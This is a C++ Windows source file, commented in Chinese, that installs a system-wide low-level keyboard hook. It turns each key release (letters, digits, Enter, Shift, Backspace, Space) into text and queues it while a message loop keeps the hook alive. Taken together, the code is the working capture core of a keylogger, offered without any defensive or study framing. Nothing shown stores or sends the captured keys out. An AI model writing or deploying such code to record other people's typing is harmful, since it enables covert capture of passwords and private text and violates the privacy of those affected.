#include <windows.h>
#include<iostream>
#include <stdio.h>
#include <conio.h>
#include <tchar.h>
#include <queue>

using namespace std;

HHOOK keyboardHook = 0;		// 钩子句柄
static int status =0;
static queue<string> output;

LRESULT CALLBACK LowLevelKeyboardProc(
    _In_ int nCode,		// 规定钩子如何处理消息，小于 0 则直接 CallNextHookEx
    _In_ WPARAM wParam,	// 消息类型
    _In_ LPARAM lParam	// 指向某个结构体的指针，这里是 KBDLLHOOKSTRUCT（低级键盘输入事件）
    ) {
    KBDLLHOOKSTRUCT* ks = (KBDLLHOOKSTRUCT*)lParam;		// 包含低级键盘输入事件信息
    /*
    typedef struct tagKBDLLHOOKSTRUCT {
        DWORD     vkCode;		// 按键代号
        DWORD     scanCode;		// 硬件扫描代号，同 vkCode 也可以作为按键的代号。
        DWORD     flags;		// 事件类型，一般按键按下为 0 抬起为 128。
        DWORD     time;			// 消息时间戳
        ULONG_PTR dwExtraInfo;	// 消息附加信息，一般为 0。
    }KBDLLHOOKSTRUCT,*LPKBDLLHOOKSTRUCT,*PKBDLLHOOKSTRUCT;
    */
    if (ks->flags == 128 || ks->flags == 129)
    {
        // 监控键盘
        switch (ks->vkCode) {
        case 0x30: case 0x60:
            output.push("0");
            break;
        case 0x31: case 0x61:
            output.push("1");
            break;
        case 0x32: case 0x62:
            output.push("2");
            break;
        case 0x33: case 0x63:
            output.push("3");
            break;
        case 0x34: case 0x64:
            output.push("4");
            break;
        case 0x35: case 0x65:
            output.push("5");
            break;
        case 0x36: case 0x66:
            output.push("6");
            break;
        case 0x37: case 0x67:
            output.push("7");
            break;
        case 0x38: case 0x68:
            output.push("8");
            break;
        case 0x39: case 0x69:
            output.push("9");
            break;
        case 0x41:
            output.push("a");
            break;
        case 0x42:
            output.push("b");
            break;
        case 0x43:
            output.push("c");
            break;
        case 0x44:
            output.push("d");
            break;
        case 0x45:
            output.push("e");
            break;
        case 0x46:
            output.push("f");
            break;
        case 0x47:
            output.push("g");
            break;
        case 0x48:
            output.push("h");
            break;
        case 0x49:
            output.push("i");
            break;
        case 0x4A:
            output.push("j");
            break;
        case 0x4B:
            output.push("k");
            break;
        case 0x4C:
            output.push("l");
            break;
        case 0x4D:
            output.push("m");
            break;
        case 0x4E:
            output.push("n");
            break;
        case 0x4F:
            output.push("o");
            break;
        case 0x50:
            output.push("p");
            break;
        case 0x51:
            output.push("q");
            break;
        case 0x52:
            output.push("r");
            break;
        case 0x53:
            output.push("s");
            break;
        case 0x54:
            output.push("t");
            break;
        case 0x55:
            output.push("u");
            break;
        case 0x56:
            output.push("v");
            break;
        case 0x57:
            output.push("w");
            break;
        case 0x58:
            output.push("x");
            break;
        case 0x59:
            output.push("y");
            break;
        case 0x5A:
            output.push("z");
            break;
        case 0x6A:
            output.push("*");
            break;
        case 0x6B:
            output.push("+");
            break;
        case 0x6D:
            output.push("-");
            break;
        case 0x6E:
            output.push(".");
            break;
        case 0x6F:
            output.push("/");
            break;
        case 0x0D:
            output.push("Enter");
            break;
        case 0xA0: case 0xA1:
            output.push("Shift");
            break;
        case 0x08:
            output.push("Backspace");
            break;
        case 0x20:
            output.push("Space");
            break;
        }

        //return 1;		// 使按键失效
    }

    // 将消息传递给钩子链中的下一个钩子
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int hook()
{
    // 安装钩子
    keyboardHook = SetWindowsHookEx(
        WH_KEYBOARD_LL,			// 钩子类型，WH_KEYBOARD_LL 为键盘钩子
        LowLevelKeyboardProc,	// 指向钩子函数的指针
        GetModuleHandleA(NULL),	// Dll 句柄
        NULL
        );
    if (keyboardHook == 0) { cout << "挂钩键盘失败" << endl; return -1; }

    //不可漏掉消息处理，不然程序会卡死
    MSG msg;
    while (status==1)
    {
        // 如果消息队列中有消息
        if (PeekMessageA(
                &msg,		// MSG 接收这个消息
                NULL,		// 检测消息的窗口句柄，NULL：检索当前线程所有窗口消息
                NULL,		// 检查消息范围中第一个消息的值，NULL：检查所有消息（必须和下面的同时为NULL）
                NULL,		// 检查消息范围中最后一个消息的值，NULL：检查所有消息（必须和上面的同时为NULL）
                PM_REMOVE	// 处理消息的方式，PM_REMOVE：处理后将消息从队列中删除
                )) {
            // 把按键消息传递给字符消息
            TranslateMessage(&msg);

            // 将消息分派给窗口程序
            DispatchMessageW(&msg);
        }
        else
            Sleep(0);    //避免CPU全负载运行
    }
    // 删除钩子
    UnhookWindowsHookEx(keyboardHook);

    return 0;
}
